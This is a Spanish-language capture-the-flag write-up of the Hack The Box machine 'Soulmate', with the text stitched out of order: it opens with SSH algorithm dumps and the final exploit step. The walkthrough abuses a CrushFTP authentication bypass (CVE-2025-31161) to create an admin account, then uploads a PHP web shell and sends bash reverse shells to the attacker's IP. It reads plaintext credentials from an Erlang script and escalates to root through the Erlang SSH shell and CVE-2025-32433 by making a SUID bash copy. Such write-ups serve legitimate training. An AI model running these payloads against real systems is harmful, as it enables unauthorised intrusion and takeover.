       curve25519-sha256,curve25519-sha256@libssh.org,curve448-sha512,ecdh-sha2-nistp521,ecdh-sha2-nistp384,ecdh-sha2-nistp256,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,ext-info-s,kex-strict-s-v00@openssh.com9ssh-ed25519,ecdsa-sha2-nistp256,rsa-sha2-512,rsa-sha2-256aes256-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-gcm@openssh.com,aes128-ctr,chacha20-poly1305@openssh.com,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbcaes256-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-gcm@openssh.com,aes128-ctr,chacha20-poly1305@openssh.com,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc{hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512,hmac-sha2-256,hmac-sha1-etm@openssh.com,hmac-sha1{hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512,hmac-sha2-256,hmac-sha1-etm@openssh.com,hmac-sha1none,zlib@openssh.com,zlibnone,zlib@openssh.com,zlib
[+] Running command: os:cmd("bash -c 'cp /bin/bash /tmp/fakebash && chmod 4755 /tmp/fakebash'").
[✓] Exploit sent. If vulnerable, command should execute.
```

Si ahora verificamos el binario `fakebash` que acabamos de crear e intentamos lanzarlo con la opción `-p`, obtendremos una shell con el `euid` del usuario `root`

``` bash
ben@soulmate:~$ ls /tmp/fakebash 
/tmp/fakebash
ben@soulmate:~$ /tmp/fakebash -p
fakebash-5.1# id
uid=1000(ben) gid=1000(ben) euid=0(root) groups=1000(ben)
fakebash-5.1# cat root/root.txt 
a19...
```
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ing -c1 10.129.2.12             
PING 10.129.2.12 (10.129.2.12): 56 data bytes
64 bytes from 10.129.2.12: icmp_seq=0 ttl=63 time=494.714 ms

--- 10.129.2.12 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 494.714/494.714/494.714/0.000 ms
andrees@HackBookPro ~ $ 
~~~


## Port Scanning 

Comenzaremos con un escaneo de puertos que se encargue de descubrir puertos abiertos en la máquina víctima. Primeramente utilizaremos el protocolo TCP/IPv4

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.2.12 -oG openPorts
Starting Nmap 7.93 ( https://nmap.org ) at 2026-02-12 23:37 -03

Nmap scan report for 10.129.2.12
Host is up (6.3s latency).
Not shown: 48933 filtered tcp ports (no-response), 16600 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 57.91 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Vemos dos servicios en la captura, `ssh` y `http`. Realizaremos un segundo escaneo para identificar la versión de los servicios expuestos que descubrimos

~~~ bash
nmap -p 22,80 -sVC 10.129.2.12 -oN services            
Starting Nmap 7.93 ( https://nmap.org ) at 2026-02-12 23:39 -03
Nmap scan report for 10.129.2.12
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.64 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal


## Web Enumeration

En cuanto al servicio web, el servidor nos intenta aplicar una redirección hacia `soulmate.htb`. Agregaremos este nombre de dominio a nuestro archivo `/etc/hosts` para aplicar correctamente resolución `DNS`

``` bash
echo '10.129.2.12 soulmate.htb' | sudo tee -a /etc/hosts
10.129.2.12 soulmate.htb
```

Al navegar hasta `soulmate.htb`, veremos la siguiente página web. Este parece ser un sitio de citas

![image-center](/assets/images/posts/soulmate-1-hackthebox.png)
{: .align-center}

En cuanto a tecnologías web, podemos lanzar un escaneo posterior al ajuste en `/etc/hosts` para enumerarlas con la herramienta `whatweb`. 

Nuestro objetivo es detectar si se emplea algún gestor de contenido como un CMS, ver la versión del servidor web, etc.

``` bash
whatweb http://soulmate.htb/
http://soulmate.htb/ [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[hello@soulmate.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.2.12], Script, Title[Soulmate - Find Your Perfect Match], nginx[1.18.0]
```

### Login Page

Desde la barra de navegación superior veremos el enlace `Login`, el cual nos lleva hasta la siguiente página para iniciar sesión: `/login.php`

![image-center](/assets/images/posts/soulmate-2-hackthebox.png)
{: .align-center}

### Register Page

Desde el enlace `Sign up here!` o desde el gran botón `Get Started` en la barra de navegación, seremos redirigidos a la siguiente web: `/register.php`, donde podremos crear una cuenta en la plataforma web

![image-center](/assets/images/posts/soulmate-3-hackthebox.png)
{: .align-center}

### Web Access

Al iniciar sesión con una nueva cuenta, el servidor nos llevará hacia `profile.php`

![image-center](/assets/images/posts/soulmate-4-hackthebox.png)
{: .align-center}

 Desde este punto podemos comenzar a probar abusar de alguna de las funcionalidades, como la subida de imágenes, intentos de inyección en los formularios, etc.

### (Failed) Directory Fuzzing

Como no vemos un vector claro del cual intentar abusar, podemos enumerar rutas o archivos dentro de este servidor web utilizando la técnica de `Fuzzing`.

> El `fuzzing` de directorios (también conocido como `Directory Fuzzing` o `Directory Bruteforcing`) es una técnica que puede encontrar rutas ocultas dentro de. un servidor web. 
> 
> Se utilizan diccionarios de rutas comunes para solicitar a la aplicación web cada ruta hasta agotar la lista.
{: .notice--info}

Herramientas como `feroxbuster` o `ffuf` son capaces de buscar directorios y/o archivos recursivamente en el servidor web

``` bash
feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://soulmate.htb/ -x php,txt,html -r
                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://soulmate.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html]
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      473l      932w     8657c http://soulmate.htb/assets/css/style.css
200      GET      178l      488w     8554c http://soulmate.htb/login.php
200      GET      238l      611w    11107c http://soulmate.htb/register.php
200      GET      306l     1061w    16688c http://soulmate.htb/
200      GET      306l     1061w    16688c http://soulmate.htb/index.php
403      GET        7l       10w      162c http://soulmate.htb/assets/
403      GET        7l       10w      162c http://soulmate.htb/assets/css/
403      GET        7l       10w      162c http://soulmate.htb/assets/images/
403      GET        7l       10w      162c http://soulmate.htb/assets/images/profiles/
```

### Subdomains / Virtual Hosts Fuzzing

Como no encontramos nada interesante con `Directory Fuzzing`, podemos optar por alternativas como `Fuzzing` a subdominios (`Subdomain Fuzzing`).

> Recordemos que un servidor web puede alojar múltiples nombres de dominio (sitios web). Para 
{: .notice--info}

Al igual que con los directorios, el `fuzzing` dirigido a enumerar subdominios puede encontrar sitios que no son visibles a simple vista 

``` bash
gobuster vhost -u http://soulmate.htb -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://soulmate.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: ftp.soulmate.htb Status: 302 [Size: 0] [--> /WebInterface/login.html]
```

### `ftp.soulmate.htb`

Añadiremos este subdominio a nuestro archivo `/etc/hosts` para resolverlo  correctamente a través de `DNS` (debido a que estamos conectados por VPN a la red, no internet)

``` bash
sudo sed -i 's/soulmate.htb$/& ftp.&/' /etc/hosts
```

Al visitar el subdominio desde el navegador, veremos la siguiente página web del panel para iniciar sesión dentro de la plataforma

![image-center](/assets/images/posts/soulmate-5-hackthebox.png)
{: .align-center}

Dentro del código fuente de la web veremos la versión en algunas funciones `javascript`

![image-center](/assets/images/posts/soulmate-6-hackthebox.png)
{: .align-center}

Haciendo una simple búsqueda podemos dar con algunos CVEs que pueden aplicar a esta versión de `CrushFTP`

![image-center](/assets/images/posts/soulmate-7-hackthebox.png)
{: .align-center}

<br>


# Intrusión / Explotación
---
## CVE-2025-31161 - CrushFTP Authentication Bypass

CVE-2025-31161 es una vulnerabilidad en `CrushFTP`, concretamente las versiones anteriores a la `10.8.4` y `11` anterior a la `11.3.1`, permiten eludir la autenticación y ganar acceso administrativo a la plataforma

### Understanding Vulnerability

> `CrushFTP` es un software de servidor de transferencia de archivos seguro (`MFT` - `Managed File Transfer`) y multi-plataforma, utilizado para compartir datos confidenciales a través de Internet mediante protocolos como `SFTP`, `FTPS`, `HTTP`, `HTTPS` y `WebDAV`. 
{: .notice--info}

`CrushFTP` implementa el método de autenticación de `Amazon` (`AWS4-HMAC`), el formato es similar al siguiente

``` http
Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/
```

Para entender a nivel técnico cómo funciona este `bypass`, podemos consultar el siguiente post de [`Project Discovery`](https://projectdiscovery.io/blog/crushftp-authentication-bypass).

La autenticación dentro de `CrushFTP` comienza con el método `loginCheckHeaderAuth()`, el cual se activa cuando se recibe una solicitud `HTTP` que contiene una cabecera de autorización `S3`.

Cuando `username` no contiene una virgulilla (`~`), se llama a la función `login_user_pass()`, enviando el valor de `lookup_user_pass` en `true`

``` java
// Inside loginCheckHeaderAuth() in ServerSessionHTTP.java
if (this.headerLookup.containsKey("Authorization".toUpperCase()) && 
    this.headerLookup.getProperty("Authorization".toUpperCase()).trim().startsWith("AWS4-HMAC")) {
    // ...
    
    // Here, lookup_user_pass gets set to true by default
    boolean lookup_user_pass = true;
    
    // It only changes to false if the username contains a tilde
    if (s3_username3.indexOf("~") >= 0) {
        user_pass = user_name.substring(user_name.indexOf("~") + 1);
        user_name = user_name.substring(0, user_name.indexOf("~"));
        lookup_user_pass = false;
    }
    
    // The lookup_user_pass flag is then passed directly as the first parameter
    if (this.thisSession.login_user_pass(lookup_user_pass, false, user_name, lookup_user_pass ? "" : user_pass)) {
        // Authentication succeeds
    }
}
```

En la función `login_user_pass()`, existe un parámetro booleano llamado `anyPass`, el cual desde la llamada anterior contendrá el valor de la variable `lookup_user_pass`. 

Posteriormente, este valor se pasa a la función `verify_user()`

``` java
// Inside SessionCrush.java
public boolean login_user_pass(boolean anyPass, boolean doAfterLogin, String user_name, String user_pass) throws Exception {
    // Various validations and logging happen here

...
<SNIP>
...
            // Eventually we call verify_user with the anyPass parameter
            boolean verified = verify_user(user_name, verify_password, anyPass, doAfterLogin);
            
            if (verified && this.user != null) {
                // Authentication success handling
                return true;
            }
        }
    }
    
    return false;
}
```

En la función `verify_user()`,  lo crítico viene en que si `anyPass` es `true`, no necesitaremos un usuario para validar la autenticación

``` java
// Inside SessionCrush.java
public boolean verify_user(String theUser, String thePass, boolean anyPass, boolean doAfterLogin) {
    // Various user validation and formatting logic
...
<SNIP>
...
    // The critical check: if anyPass is true, we don't consider a null user to be an authentication failure
    if (!anyPass && this.user == null && !theUser2.toLowerCase().equals("anonymous")) {
        this.user_info.put("plugin_user_auth_info", "Password incorrect.");
    }
    
    // Various other checks and return logic
    return this.user != null;
}
```

El paso final está en el método `verify_user()`, donde el parámetro `anyPass` determina si se requiere verificación de contraseña

``` java
if (anyPass && user.getProperty("username").equalsIgnoreCase(the_user)) {
        return user;  // Authentication succeeds without any password check
    }
```

El problema está en que como inicialmente el servidor recibe una cabecera `AWS` de autorización, el servidor omite la validación de usuario y contraseña

### Proof of Concept

Un atacante puede enviar una cabecera de `AWS` para realizar el `Bypass` de autenticación.

> En este ejemplo obtendremos un listado de usuarios con el comando `getUserList`.
{: .notice--warning}

``` http
GET /WebInterface/function/?command=getUserList&serverGroup=MainUsers&c2f=1111 HTTP/1.1
Host: ftp.soulmate.htb

...
<SNIP>
...

Cookie: CrushAuth=1762138139030_JKnkdi2xCKJd1NAVQRQ9Eytd6I8UVl1111
Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/
```

Con `Burpsuite` interceptaremos una solicitud `HTTP` hacia el subdominio `ftp.soulmate.htb`, modificaremos las cabeceras y la `URL`

~~~ http
GET /WebInterface/function/?command=getUserList&serverGroup=MainUsers&c2f=1111 HTTP/1.1
Host: ftp.soulmate.htb
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: http://ftp.soulmate.htb/WebInterface/UserManager/index.html
Connection: keep-alive
Cookie: CrushAuth=1762138139030_JKnkdi2xCKJd1NAVQRQ9Eytd6I8UVl1111
Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
If-Modified-Since: Wed, 13 Aug 2025 18:46:10 GMT
If-None-Match: 1755110770160
Priority: u=0, i
~~~

Cuando enviemos la solicitud veremos un listado en `XML` con los usuarios válidos dentro de la plataforma

![image-center](/assets/images/posts/soulmate-8-hackthebox.png)
{: .align-center}

### Exploiting

Además, es posible hacer `bypass` de la autenticación para crear un usuario con permisos administrativos en la plataforma, podemos utilizar la siguiente [prueba de concepto](https://github.com/Immersive-Labs-Sec/CVE-2025-31161)

``` bash
# Virtual Environment with uv tool
uv venv
source .venv/bin/activate
uv pip install requests argparse

# Exploit
uv run cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user crushadmin --new_user fakeadmin --password 'Test123!' 
[+] Preparing Payloads
  [-] Warming up the target
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: fakeadmin
   [*] Password: Test123!.
```

Durante la ejecución del exploit, se crea un nuevo usuario enviando sintaxis `XML`

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<user type="properties">
<user_name>fakeadmin</user_name>
<password>Test123!</password>
<extra_vfs type="vector"></extra_vfs>
<version>1.0</version>
<root_dir>/</root_dir>
<userVersion>6</userVersion>
<max_logins>0</max_logins>
<site>(SITE_PASS)(SITE_DOT)(SITE_EMAILPASSWORD)(CONNECT)</site>
<created_by_username>crushadmin</created_by_username>
<created_by_email></created_by_email>
<created_time>1744120753370</created_time>
<password_history></password_history>
</user>

<?xml version="1.0" encoding="UTF-8"?>
<vfs type="vector">
</vfs>

<?xml version="1.0" encoding="UTF-8"?>
<VFS type="properties">
<item name="/">(read)(view)(resume)</item>
</VFS>
```

Desde `Burpsuite` la solicitud se ve de la siguiente manera, el servidor procesará la solicitud correctamente y retornará un código `HTTP 200 OK`

![image-center](/assets/images/posts/soulmate-9-hackthebox.png)
{: .align-center}


## Web Access

Ahora que hemos creado un nuevo usuario en la plataforma, iniciaremos sesión

![image-center](/assets/images/posts/soulmate-10-hackthebox.png)
{: .align-center}

Hemos creado un usuario con permisos administrativos, por lo que ahora podemos acceder al panel de administración desde la pestaña `Admin`

![image-center](/assets/images/posts/soulmate-11-hackthebox.png)
{: .align-center}

### User Management

Seleccionaremos la pestaña `User Management`, desde allí podremos administrar las cuentas de usuario dentro de la plataforma

![image-center](/assets/images/posts/soulmate-12-hackthebox.png)
{: .align-center}

Inspeccionando a los usuarios, veremos que `ben` tiene acceso a un directorio llamado `webProd`

![image-center](/assets/images/posts/soulmate-13-hackthebox.png)
{: .align-center}

Este directorio contiene los archivos de la web principal que vimos al principio. 

En este caso `ben` posee acceso de lectura y escritura, podemos darnos cuenta por el permiso `Upload` marcado con un `check` 

![image-center](/assets/images/posts/soulmate-14-hackthebox.png)
{: .align-center}

### Password Change

En este punto podremos intentar conectarnos a la plataforma como `ben` para poder acceder directamente a este directorio, ya sea para descargar estos archivos o para subir uno malicioso.

La forma más sencilla de acceder a la plataforma como el usuario `ben` es simplemente cambiando su contraseña, de la siguiente forma

![image-center](/assets/images/posts/soulmate-15-hackthebox.png)
{: .align-center}


## Web Access as `ben`

Cuando accedamos a `CrushFTP` como `ben`, si nos dirigimos al directorio `webProd`

![image-center](/assets/images/posts/soulmate-16-hackthebox.png)
{: .align-center}

Cuando estemos dentro de `webProd` nos aparecerá la opción para subir archivos desde el botón `Add Files`

![image-center](/assets/images/posts/soulmate-17-hackthebox.png)
{: .align-center}

### RCE

Como el servidor web contiene y ejecuta archivos `PHP`, intentaremos subir una web shell o una reverse shell en este lenguaje.

En mi caso elegí subir un archivo que actúe como una web shell, el cual contiene el siguiente código simple en `PHP`

``` php
<?php system($_GET['cmd']) ;?>
```

Este código simplemente ejecutará una instrucción con la función `system()` y recibirá el comando a través del parámetro `cmd` a través del verbo `HTTP` `GET`, por la URL

![image-center](/assets/images/posts/soulmate-18-hackthebox.png)
{: .align-center}

Cuando la subida se haya completado, nos dirigiremos hacia el sitio web principal (`soulmate.htb`).

Intentaremos ejecutar un comando a través de nuestra web shell o disparar la reverse shell (en caso de que hayas optado por esa opción)

![[Pasted image 20251103010504.png]]

Hemos validado que podemos ejecutar comandos, ahora intentaremos enviar algo más complejo como una reverse shell en `bash` hacia nuestra dirección IP

``` bash
bash -c 'bash -i >& /dev/tcp/10.10.X.X/443 0>&1'
```

Antes de enviar la reverse shell al servidor para que la ejecute, iniciaremos un listener por un puerto (en mi caso el `443`)

``` bash
nc -lvnp 443
```

Para evitar problemas con los caracteres especiales, necesitaremos aplicar `URL Encode` en el payload, de forma que la URL que visitaremos se verá similar a lo siguiente

``` bash
http://soulmate.htb/cmd.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.11%2F443%200%3E%261%27
```


## Shell as `www-data`

Al enviar el comando en el navegador, al cabo de un momento recibiremos una shell como el usuario `www-data`

``` bash
nc -lvnp 443
Connection from 10.10.11.86:48168
bash: cannot set terminal process group (996): Inappropriate ioctl for device
bash: no job control in this shell
www-data@soulmate:~/soulmate.htb/public$ 
```

### TTY Treatment

Realizaremos un tratamiento de la `TTY` para obtener una consola interactiva, que nos permita ejecutar atajos como `Ctrl+C` sin que el proceso de la shell termine

``` bash
www-data@soulmate:~/soulmate.htb/public$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@soulmate:~/soulmate.htb/public$ ^Z
[1]  + 8178 suspended  nc -lvnp 443
andrees@HackBookPro content $ stty raw -echo;fg
[1]  + 8178 continued  nc -lvnp 443
                                   reset xterm
```

Haremos unos ajustes adicionales de proporciones con el comando `stty`, además del tipo de terminal, que nos permitirá limpiar la pantalla con el atajo `Ctrl+L`

``` bash
www-data@soulmate:~/soulmate.htb/public$ export TERM=xterm
www-data@soulmate:~/soulmate.htb/public$ stty rows 42 columns 152
```


## System Enumeration

Hemos ganado acceso al servidor, procederemos con una enumeración del sistema para entender el contexto, permisos, etc. Además, enumeraremos vías potenciales de escalada de privilegios. 

> Personalmente me gusta enumerar manualmente de forma básica, si no encuentro algo, uso herramientas automatizadas como `LinPEAS`.
{: .notice--warning}

### Users

Al consultar el archivo `passwd` en busca de usuarios válidos en el sistema, veremos que existe solamente `ben` además de `root`

``` bash
www-data@soulmate:~/soulmate.htb/public$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ben:x:1000:1000:,,,:/home/ben:/bin/bash
```

### Processes Monitoring

En cuanto a procesos en ejecución, veremos que `root` ejecuta el recurso `start.escript`, bajo la ruta `erlang` en `/usr/local/lib`.

> [`Erlang`](https://www.erlang.org/) es un lenguaje de programación funcional y entorno de ejecución de código abierto, diseñado por Ericsson para sistemas distribuidos, tolerantes a fallos y en tiempo real de alta disponibilidad.
{: .notice--info}

``` bash
root         991  0.0  1.7 2256328 70844 ?       Ssl  Nov02   0:16 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
```


## Credentials Leakage

Dentro del directorio `/usr/lib/local/erlang`, veremos dos archivos los cuales son utilizados por el proceso que está ejecutando `root`

``` bash
www-data@soulmate:~/soulmate.htb/public$ ls -la /usr/local/lib/erlang_login/
total 16
drwxr-xr-x 2 root root 4096 Aug 15  2025 .
drwxr-xr-x 5 root root 4096 Aug 14  2025 ..
-rwxr-xr-x 1 root root 1570 Aug 14  2025 login.escript
-rwxr-xr-x 1 root root 1427 Aug 15  2025 start.escript
```

Tenemos permisos de lectura para ambos, aprovecharemos esto para intentar ver información dentro de ellos.

Al consultar el archivo `start.escript`, notaremos que contiene unas credenciales casi al final

``` bash
www-data@soulmate:~/soulmate.htb$ cat /usr/local/lib/erlang_login/start.escript
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
```


## Shell as `ben`

Esta contraseña en texto claro supuestamente es válida para el usuario `ben`. Antes de intentar conectarnos con ella podemos validarla con herramientas como `netexec`

``` bash
nxc ssh soulmate.htb -u ben -p 'HouseH0ldings998'
SSH         10.129.2.173    22     soulmate.htb     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         10.129.2.173    22     soulmate.htb     [+] ben:HouseH0ldings998  Linux - Shell access!
```

La credencial es válida, por lo que podremos conectarnos por `ssh` como el usuario `ben`

``` bash
ssh -o StrictHostKeyChecking=no ben@soulmate.htb
Warning: Permanently added 'soulmate.htb' (ED25519) to the list of known hosts.
ben@soulmate.htb\'s password: 
Last login: Fri Feb 20 17:12:27 2026 from 10.10.16.38
ben@soulmate:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben)
```

Ya podremos ver la flag del usuario sin privilegios dentro del directorio `/home/ben`

``` bash
ben@soulmate:~$ cat user.txt 
05e...
```
<br>


# Escalada de Privilegios
---
## Abusing `Erlang`/`OTP` SSH Server

Recordemos el archivo `start.script` desde donde obtuvimos las credenciales del usuario `ben`.

Este script en `Erlang` inicia un servidor `ssh` en el puerto `2222` localmente

``` bash
www-data@soulmate:~/soulmate.htb/public$ head -n 20 /usr/local/lib/erlang_login/start.escript
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},
```

En teoría debería estar el puerto `2222` a la escucha, podemos comprobarlo con `netcat`

``` bash
nc -v 127.0.0.1 2222
Connection to 127.0.0.1 2222 port [tcp/*] succeeded!
SSH-2.0-Erlang/5.2.9
```

### SSH Access

Podemos conectarnos a este servidor `ssh` local con las credenciales de `ben`

> También podemos conectarnos como el usuario `www-data`, ojito ahí.
{: .notice--danger}

``` bash
ben@soulmate:~$ ssh ben@localhost -p 2222
ben@localhost's password: 
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1> 
```

Esta no es una terminal de Linux, sino que cambia la sintaxis por lenguaje `Erlang`, cada línea debe terminar con `.`.

Podemos ver el panel de ayuda con la función `help()`

``` bash
(ssh_runner@soulmate)1> help().

** shell internal commands **
b()        -- display all variable bindings
e(N)       -- repeat the expression in query <N>
f()        -- forget all variable bindings
f(X)       -- forget the binding of variable X
h()        -- history
h(Mod)     -- help about module
h(Mod,Func)-- help about function in module
h(Mod,Func,Arity) -- help about function with arity in module
ht(Mod)    -- help about a module's types
ht(Mod,Type) -- help about type in module
ht(Mod,Type,Arity) -- help about type with arity in module
hcb(Mod)    -- help about a module's callbacks
hcb(Mod,CB) -- help about callback in module
hcb(Mod,CB,Arity) -- help about callback with arity in module
history(N) -- set how many previous commands to keep
results(N) -- set how many previous command results to keep
catch_exception(B) -- how exceptions are handled
v(N)       -- use the value of query <N>
rd(R,D)    -- define a record
rf()       -- remove all record information
...
<SNIP>
...
```

Como el usuario que ejecuta este servicio es `root`, podremos ejecutar cualquier acción privilegiada a través de esta shell.

Una forma de ejecutar comandos dentro de esta shell directamente podemos hacer uso del módulo [`os`](https://erlang.org/documentation/doc-5.8.4/lib/kernel-2.14.4/doc/html/os.html) y la función `cmd()`

``` bash
(ssh_runner@soulmate)3> os:cmd('id').

"uid=0(root) gid=0(root) groups=0(root)\n"
```


## Root Time

Podemos ejecutar un comando que directamente nos envíe una shell hacia nuestra máquina por un puerto.

Iniciaremos un listener que se encargue de recibir la conexión

``` bash
 nc -lvnp 4444
```

Ahora desde la shell del servidor `ssh` de `earlang`, ejecutaremos con la función `cmd()` un comando que entable una conexión hacia nuestro listener

``` bash
(ssh_runner@soulmate)2> os:cmd("bash -c 'bash -i >& /dev/tcp/10.10.14.27/4444 0>&1'").
```

Al ejecutar la instrucción, veremos que recibiremos una consola de `bash` como el usuario `root`

``` bash
nc -lvnp 4444
Connection from 10.129.2.173:55590
bash: cannot set terminal process group (158415): Inappropriate ioctl for device
bash: no job control in this shell
root@soulmate:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

### TTY Treatment

Realizaremos un pequeño tratamiento de la `TTY` como lo hicimos anteriormente con la shell que obtuvimos al principio

``` bash
root@soulmate:/# script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
root@soulmate:/# ^Z
[1]  + 7337 suspended  nc -lvnp 4444
andrees@HackBookPro exploits $ stty raw -echo;fg                                                
[1]  + 7337 continued  nc -lvnp 4444
                                    reset xterm
```

Ya podremos ver la última flag ubicada en el directorio `/root`

``` bash
root@soulmate:/# cat root/root.txt 
a19...
```


## (Intended) CVE-2025-32433 - Pre-Auth RCE in `Erlang`/`OTP` SSH Server

Buscando en internet acerca de vulnerabilidades asociadas a `Erlang/OTP SSH Server`, descubriremos que CVE-2025-32433 podría aplicar.

En versiones anteriores a `OTP-27.3.3`, `OTP-26.2.5.11` y `OTP-25.3.2.20`, un servidor `Earlang/OTP SSH` permite un atacante realizar una ejecución remota de código sin autenticación previa.

Podemos utilizar la siguiente [prueba de concepto](https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC) para ejecutar comandos en el servidor `SSH`

``` bash
ben@soulmate:~$ python3 poc.py 127.0.0.1 -p 2222 --command 'cp /bin/bash /tmp/fakebash && chmod 4755 /tmp/fakebash'
[*] Target: 127.0.0.1:2222
